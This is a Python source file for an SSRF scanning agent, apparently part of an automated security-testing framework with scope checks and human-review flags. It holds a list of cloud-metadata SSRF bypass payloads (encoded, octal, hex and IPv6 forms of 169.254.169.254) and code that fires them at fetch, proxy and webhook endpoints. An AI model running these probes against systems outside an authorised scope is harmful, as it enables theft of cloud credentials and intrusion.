"""SSRF probing agent with metadata bypass payloads and callback indicators."""

from __future__ import annotations

from typing import Any, Dict, List
from urllib.parse import urlencode

from agents.base_agent import BaseAgent


class SSRFAgent(BaseAgent):
    """Tests SSRF sinks with cloud metadata bypass variants."""

    METADATA_BYPASSES = [
        "http://169.254.169.254/latest/meta-data/",
        "http://[::ffff:169.254.169.254]/latest/meta-data/",
        "http://0xA9FEA9FE/latest/meta-data/",
        "http://0251.0376.0251.0376/latest/meta-data/",
        "http://169.254.169.254.nip.io/latest/meta-data/",
        "http://2130706433/latest/meta-data/",
        "http://169.254.169.254%252f/latest/meta-data/",
        "http://169.254.169.254%23@example.com/",
        "http://127.1/latest/meta-data/",
        "http://localhost@169.254.169.254/latest/meta-data/",
    ]

    async def _probe_endpoint(self, endpoint: str, callback_domain: str) -> List[Dict[str, Any]]:
        """Probe one endpoint with SSRF payload set."""
        findings: List[Dict[str, Any]] = []
        param_names = ["url", "uri", "target", "dest", "redirect", "webhook"]

        for param, payload in zip(param_names * 2, self.METADATA_BYPASSES):
            probe_url = f"{endpoint}?{urlencode({param: payload})}"
            if not self.check_scope(probe_url):
                continue
            resp = await self.request("GET", probe_url, allow_redirects=False)
            body = resp.get("body", "").lower()
            marker = any(token in body for token in ["meta-data", "ami-id", "instance-id"])
            header_leak = any("169.254.169.254" in v for v in resp.get("headers", {}).values())
            callback_hint = callback_domain and callback_domain in body

            if marker or header_leak or callback_hint:
                severity = "high" if marker else "medium"
                findings.append(
                    {
                        "vuln_type": "ssrf",
                        "severity": severity,
                        "endpoint": endpoint,
                        "parameter": param,
                        "payload": payload,
                        "evidence": self.build_evidence(
                            response=resp,
                            method="GET",
                            request_url=probe_url,
                            extra={
                            "marker_detected": marker,
                            "header_leak": header_leak,
                            "callback_hint": callback_hint,
                            },
                        ),
                        "confidence": 0.84 if marker else 0.65,
                        "requires_human_review": severity == "high",
                    }
                )
        return findings

    async def run(self) -> Dict[str, Any]:
        """Execute SSRF scans against common URL sink endpoints."""
        base = self.target if self.target.startswith("http") else f"https://{self.target}"
        callback_domain = self.config.get("callback_domain", "")
        endpoints = [
            f"{base.rstrip('/')}/fetch",
            f"{base.rstrip('/')}/proxy",
            f"{base.rstrip('/')}/webhook/test",
            f"{base.rstrip('/')}/api/preview",
        ]

        findings: List[Dict[str, Any]] = []
        for endpoint in endpoints:
            for finding in await self._probe_endpoint(endpoint, callback_domain):
                findings.append(finding)
                await self.save_finding(finding)

        return self.handoff(
            phase="hunt",
            findings=findings,
            confidence=0.81 if findings else 0.3,
            requires_human_review=any(f.get("requires_human_review") for f in findings),
        )
